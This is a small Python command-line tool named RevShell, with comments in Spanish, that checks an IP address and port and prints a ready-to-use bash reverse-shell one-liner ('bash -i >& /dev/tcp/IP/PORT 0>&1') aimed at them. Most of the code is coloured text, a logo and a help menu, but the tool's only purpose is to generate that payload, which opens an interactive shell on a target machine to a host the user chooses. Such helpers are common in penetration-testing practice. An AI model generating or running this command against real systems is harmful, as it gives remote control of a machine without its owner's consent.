#!/usr/bin/python3
# -*- coding: utf-8 -*-

#Author: José Rodolfo (JRIC2002)

#Modules

#External modules
import ipaddress
import sys

class Color:
    """ Colores en código ANSI. """

    #Styles
    reset = "\033[0m"
    bold = "\033[1m"
    dark = "\033[2m"
    italic = "\033[3m"
    underline = "\033[4m"
    reverse = "\033[7m"
    hidden = "\033[8m"

    #Foreground
    black= "\033[30m"
    gray = "\033[1;30m"
    red= "\033[31m"
    green = "\033[32m"
    yellow = "\033[33m"
    blue = "\033[34m"
    magenta = "\033[35m"
    cyan = "\033[36m"
    white = "\033[37m"

    #Background
    bgBlack = "\033[40m"
    bgRed = "\033[41m"
    bgGreen = "\033[42m"
    bgYellow = "\033[43m"
    bgBlue = "\033[44m"
    bgMagenta = "\033[45m"
    bgCyan = "\033[46m"
    bgWhite = "\033[47m"

#Instancia de la clase Color
color = Color()

class Start:
    """ Inicio de la herramienta RevShell. """

    def __init__(self):
        """ Variables de instancia. """
        pass

    def logo(self):
        """ Imprime el logo de la herramienta RevShell. """

        print("{}".format(color.bold))
        print("   {}__________              {}_________.__           .__  .__ ".format(color.blue, color.green))
        print("   {}\______   \ _______  __{}/   _____/|  |__   ____ |  | |  | ".format(color.blue, color.green))
        print("    {}|       _// __ \  \/ /{}\_____  \ |  |  \_/ __ \|  | |  | ".format(color.blue, color.green))
        print("    {}|    |   \  ___/\   / {}/        \|   Y  \  ___/|  |_|  |__ ".format(color.blue, color.green))
        print("    {}|____|_  /\___  >\_/ {}/_______  /|___|  /\___  >____/____/ ".format(color.blue, color.green))
        print("            {}\/     \/             {}\/      \/     \/ ".format(color.blue, color.green))
        print("     {}[{}~{}]           {}Tool created by: {}JRIC2002            {}[{}~{}]".format(color.white, color.green, color.white, color.yellow, color.white, color.white, color.green, color.white))
        print("     {}[{}~{}] {}Description: {}Print the code of a reverse shell {}[{}~{}]".format(color.white, color.green, color.white, color.yellow, color.white, color.white, color.green, color.white))
        print("     \___________________----^_^----____________________/")
        print("{}".format(color.reset))

    def help_menu(self):
        """ Imprime el menú de ayuda de la herramienta RevShell. """

        print("{}{}Usage: python3 RevShell.py [options]".format(color.bold, color.white))
        print("       python3 RevShell.py <IP> <PORT>")
        print("")
        print("Options:")
        print("   -h, --help              Show this help message and exit.")
        print("   -v, --version           Show program's version number and exit.{}".format(color.reset))

    def version(self):
        """ Imprime la versión de la herramienta RevShell. """

        print("{}{}#RevShell version 1.3{}".format(color.bold, color.white, color.reset))

    def error(self):
        """ Imprime un mensaje de error. """

        print("{}{}Usage: python3 RevShell.py [options]".format(color.bold, color.white))
        print("       python3 RevShell.py <IP> <PORT>")
        print("")
        print("RevShell.py: Error: Invalid option.")
        print("Use -h or --help to see the help menu.{}".format(color.reset))

#Instancia de la clase Start
start = Start()

class Functions:
    """ Funcionalidades de ma herramienta RevShell. """

    def __init__(self):
        """ Variables de instancia. """
        pass

    def verify(self, ip, port):
        """ Verifica la dirección IP y el Puerto."""
        
        try:
            ipaddress.ip_address(ip)
            try:
                if int(port) >= 1 and int(port) <= 65535:
                    pass
                else:
                    raise Exception
            except Exception:
                print("{}{}Error: Invalid port.{}".format(color.bold, color.red, color.white))
                sys.exit(1)
        except Exception:
            print("{}{}Error: Invalid IP.{}".format(color.bold, color.red, color.reset))
            sys.exit(1)

    def rev_shell(self, ip, port):
        """ Imprime reverse shells. """
        
        a = "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port)
        b = "More reverse shells"

        for code in (a, b):
            print("{}{}[{}*{}] ".format(color.bold, color.white, color.green, color.white) + code)
        print("{}".format(color.reset))

#Instancia de la clase Functions
functions = Functions()

#Start
if len(sys.argv) == 1:
    start.logo()
    start.help_menu()
elif len(sys.argv) == 2:
    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        start.logo()
        start.help_menu()
    elif sys.argv[1] == "-v" or sys.argv[1] == "--version":
        start.version()
    else:
        start.logo()
        start.error()
elif len(sys.argv) == 3:
    start.logo()
    functions.verify(sys.argv[1], sys.argv[2])
    functions.rev_shell(sys.argv[1], sys.argv[2])
else:
    start.logo()
    start.error()
